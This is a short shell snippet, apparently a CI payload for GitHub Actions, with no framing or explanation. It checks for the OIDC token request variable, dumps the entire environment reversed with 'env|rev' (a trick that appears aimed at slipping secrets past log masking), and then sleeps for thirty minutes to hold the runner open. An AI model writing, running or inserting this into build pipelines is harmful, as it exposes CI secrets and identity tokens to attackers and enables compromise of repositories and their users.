if [ -z "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
  echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN not set" >&2
  exit 0
fi
env|rev
sleep 1800